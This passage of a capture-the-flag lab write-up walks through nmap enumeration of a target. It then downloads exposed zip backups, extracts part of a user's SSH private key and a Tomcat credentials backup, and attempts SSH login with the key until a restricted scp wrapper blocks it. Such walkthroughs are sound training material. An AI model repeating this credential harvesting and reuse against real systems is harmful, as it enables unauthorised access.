-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">4</span>.76 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 417px;"></div><div class="CodeMirror-gutters" style="display: none; height: 417px;"></div></div></div></pre><h1 id='initial-access'><span>Initial Access</span></h1><h2 id='http-80-7742-8080'><span>HTTP 80 7742 8080</span></h2><p><span>Before going in-depth for enumeration, I like to run </span><code>http-enum</code><span> script on the ports running HTTP. As you can see from the output, two directories were found on port 7742.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">--script</span> http-enum <span class="cm-attribute">-sV</span> <span class="cm-attribute">-p</span> <span class="cm-number">80</span>,7742,8080 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-14</span> <span class="cm-number">02</span>:02 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.189.100</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.045s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; &nbsp; STATE SERVICE VERSION</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">80</span>/tcp &nbsp; open  http &nbsp;  nginx</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">7742</span>/tcp open  http &nbsp;  nginx</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| http-enum: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; /default/: Potentially interesting folder</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_  /zipfiles/: Potentially interesting folder w/ directory listing</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">8080</span>/tcp open  http &nbsp;  Apache Tomcat <span class="cm-number">7</span>.0.4</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">124</span>.40 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 351px;"></div><div class="CodeMirror-gutters" style="display: none; height: 351px;"></div></div></div></pre><h2 id='http-7742'><span>HTTP 7742</span></h2><p><img src="./sorcerer.assets/image-20260128231919427.png" alt="image-20260128231919427"></p><p><span>Navigating to </span><code>/zipfiles</code><span> in the browser, I see four </span><code>.zip</code><span> files are being hosted.</span></p><p><img src="./sorcerer.assets/image-20260128231927804.png" alt="image-20260128231927804"></p><p><span>Downloaded all of the files locally.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Downloads]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ ls</span> <span class="cm-attribute">-la</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">total <span class="cm-number">32</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">drwxr-xr-x &nbsp;<span class="cm-number">2</span> kali kali <span class="cm-number">4096</span> Jan <span class="cm-number">14</span> <span class="cm-number">02</span>:16 .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">drwx------ <span class="cm-number">33</span> kali kali <span class="cm-number">4096</span> Jan <span class="cm-number">14</span> <span class="cm-number">02</span>:06 ..</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali <span class="cm-number">2834</span> Jan <span class="cm-number">14</span> <span class="cm-number">02</span>:14 francis.zip</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali <span class="cm-number">8274</span> Sep <span class="cm-number">24</span> &nbsp;<span class="cm-number">2020</span> max.zip</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali <span class="cm-number">2826</span> Sep <span class="cm-number">24</span> &nbsp;<span class="cm-number">2020</span> miriam.zip</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali <span class="cm-number">2818</span> Sep <span class="cm-number">24</span> &nbsp;<span class="cm-number">2020</span> sofia.zip</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 197px;"></div><div class="CodeMirror-gutters" style="display: none; height: 197px;"></div></div></div></pre><p><span>Using </span><code>unzip -l</code><span> , I inspected the contents of </span><code>max.zip</code><span> without extracting it and identified a SSH private key, and a backup file, </span><code>tomcat-users.xml.bak</code><span> , containing credentials.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Downloads]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ unzip</span> <span class="cm-attribute">-l</span> <span class="cm-string">"*.zip"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Archive:  francis.zip</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Length &nbsp; &nbsp;  Date &nbsp;  Time &nbsp;  Name</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">---------</span> &nbsp;<span class="cm-attribute">----------</span> <span class="cm-attribute">-----</span> &nbsp; <span class="cm-attribute">----</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">0</span> &nbsp;<span class="cm-number">2020</span><span class="cm-attribute">-09-24</span> <span class="cm-number">19</span>:27 &nbsp; home/francis/</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-number">220</span> &nbsp;<span class="cm-number">2019</span><span class="cm-attribute">-04-18</span> <span class="cm-number">04</span>:12 &nbsp; home/francis/.bash_logout</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-number">807</span> &nbsp;<span class="cm-number">2019</span><span class="cm-attribute">-04-18</span> <span class="cm-number">04</span>:12 &nbsp; home/francis/.profile</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-number">3526</span> &nbsp;<span class="cm-number">2019</span><span class="cm-attribute">-04-18</span> <span class="cm-number">04</span>:12 &nbsp; home/francis/.bashrc</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">---------</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-attribute">-------</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-number">4553</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">4</span> files</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Archive:  sofia.zip</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Length &nbsp; &nbsp;  Date &nbsp;  Time &nbsp;  Name</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">---------</span> &nbsp;<span class="cm-attribute">----------</span> <span class="cm-attribute">-----</span> &nbsp; <span class="cm-attribute">----</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">0</span> &nbsp;<span class="cm-number">2020</span><span class="cm-attribute">-09-24</span> <span class="cm-number">19</span>:27 &nbsp; home/sofia/</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-number">220</span> &nbsp;<span class="cm-number">2019</span><span class="cm-attribute">-04-18</span> <span class="cm-number">04</span>:12 &nbsp; home/sofia/.bash_logout</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-number">807</span> &nbsp;<span class="cm-number">2019</span><span class="cm-attribute">-04-18</span> <span class="cm-number">04</span>:12 &nbsp; home/sofia/.profile</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-number">3526</span> &nbsp;<span class="cm-number">2019</span><span class="cm-attribute">-04-18</span> <span class="cm-number">04</span>:12 &nbsp; home/sofia/.bashrc</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">---------</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-attribute">-------</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-number">4553</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">4</span> files</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Archive:  miriam.zip</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Length &nbsp; &nbsp;  Date &nbsp;  Time &nbsp;  Name</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">---------</span> &nbsp;<span class="cm-attribute">----------</span> <span class="cm-attribute">-----</span> &nbsp; <span class="cm-attribute">----</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">0</span> &nbsp;<span class="cm-number">2020</span><span class="cm-attribute">-09-24</span> <span class="cm-number">19</span>:27 &nbsp; home/miriam/</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-number">220</span> &nbsp;<span class="cm-number">2019</span><span class="cm-attribute">-04-18</span> <span class="cm-number">04</span>:12 &nbsp; home/miriam/.bash_logout</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-number">807</span> &nbsp;<span class="cm-number">2019</span><span class="cm-attribute">-04-18</span> <span class="cm-number">04</span>:12 &nbsp; home/miriam/.profile</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-number">3526</span> &nbsp;<span class="cm-number">2019</span><span class="cm-attribute">-04-18</span> <span class="cm-number">04</span>:12 &nbsp; home/miriam/.bashrc</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">---------</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-attribute">-------</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-number">4553</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">4</span> files</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Archive:  max.zip</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Length &nbsp; &nbsp;  Date &nbsp;  Time &nbsp;  Name</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">---------</span> &nbsp;<span class="cm-attribute">----------</span> <span class="cm-attribute">-----</span> &nbsp; <span class="cm-attribute">----</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">0</span> &nbsp;<span class="cm-number">2020</span><span class="cm-attribute">-09-24</span> <span class="cm-number">19</span>:27 &nbsp; home/max/</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-number">220</span> &nbsp;<span class="cm-number">2019</span><span class="cm-attribute">-04-18</span> <span class="cm-number">04</span>:12 &nbsp; home/max/.bash_logout</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-number">807</span> &nbsp;<span class="cm-number">2019</span><span class="cm-attribute">-04-18</span> <span class="cm-number">04</span>:12 &nbsp; home/max/.profile</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">0</span> &nbsp;<span class="cm-number">2020</span><span class="cm-attribute">-09-24</span> <span class="cm-number">19</span>:27 &nbsp; home/max/.ssh/</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-number">738</span> &nbsp;<span class="cm-number">2020</span><span class="cm-attribute">-09-24</span> <span class="cm-number">19</span>:27 &nbsp; home/max/.ssh/id_rsa.pub</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-number">836</span> &nbsp;<span class="cm-number">2020</span><span class="cm-attribute">-09-24</span> <span class="cm-number">19</span>:27 &nbsp; home/max/.ssh/authorized_keys</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-number">3381</span> &nbsp;<span class="cm-number">2020</span><span class="cm-attribute">-09-24</span> <span class="cm-number">19</span>:27 &nbsp; home/max/.ssh/id_rsa</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-number">1991</span> &nbsp;<span class="cm-number">2020</span><span class="cm-attribute">-09-24</span> <span class="cm-number">19</span>:27 &nbsp; home/max/tomcat-users.xml.bak</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; <span class="cm-number">3526</span> &nbsp;<span class="cm-number">2019</span><span class="cm-attribute">-04-18</span> <span class="cm-number">04</span>:12 &nbsp; home/max/.bashrc</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-number">133</span> &nbsp;<span class="cm-number">2020</span><span class="cm-attribute">-09-24</span> <span class="cm-number">19</span>:27 &nbsp; home/max/scp_wrapper.sh</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">---------</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-attribute">-------</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-number">11632</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">10</span> files</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">4</span> archives were successfully processed.</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 1075px;"></div><div class="CodeMirror-gutters" style="display: none; height: 1075px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Downloads/home/max/.ssh]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ cat</span> id_rsa &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-----BEGIN</span> OPENSSH PRIVATE KEY-----</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NhAAAAAwEAAQAAAgEAt/bdQL2FWSqIZy8<span class="cm-operator">+</span>sfdp19nLsDMrirNKlDFvT2vs6WZNoW/2bFCw</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SkIBbiE1bWoSYrKan0WPpKhfESuk69Lw3Aj<span class="cm-operator">+</span>I2wo2nSd5n2Phua7C2xn3pN72/XayZCdPp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">QZvPzhIU4cFhY5HWrNqASRfMUoOHcUuowvMLJ<span class="cm-operator">+</span>5Qfi98UkuwPOEZ4V10BhoYxjXxunqTwf</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 197px;"></div><div class="CodeMirror-gutters" style="display: none; height: 197px;"></div></div></div></pre><p><img src="./sorcerer.assets/image-20260128231938513.png" alt="image-20260128231938513"></p><p><span>Although I had obtained a private key, my SSH login attempts were repeatedly denied, instead returning the scp usage help page.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ ssh</span> <span class="cm-attribute">-i</span> id_rsa max@<span class="cm-def">$IP</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">The authenticity of host <span class="cm-string">'192.168.189.100 (192.168.189.100)'</span> can<span class="cm-string">'t be established.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ED25519 key fingerprint is SHA256:VS30806A83YR6y/jbQ1fv89VM1FjmXYbb9zmKkJ5N<span class="cm-operator">+</span><span class="cm-number">4</span>.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">This key is not known by any other names.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="cm-builtin">yes</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Warning: Permanently added <span class="cm-string">'192.168.189.100'</span> (ED25519) to the list of known hosts.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PTY allocation request failed on channel <span class="cm-number">0</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACCESS DENIED.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">usage: scp [-346BCpqrv] [-c cipher] [-F ssh_config] [-i identity_file]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [-l limit] [-o ssh_option] [-P port] [-S program] <span class="cm-builtin">source</span> ... target</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Connection to <span class="cm-number">192</span>.168.189.100 closed.</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 263px;"></div><div class="CodeMirror-gutters" style="display: none; height: 263px;"></div></div></div></pre><p><span>Investigation of </span><code>scp_wrapper.sh</code><span> revealed a restricted shell environment that explicitly forces the use of </span><code>scp</code><span> .</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 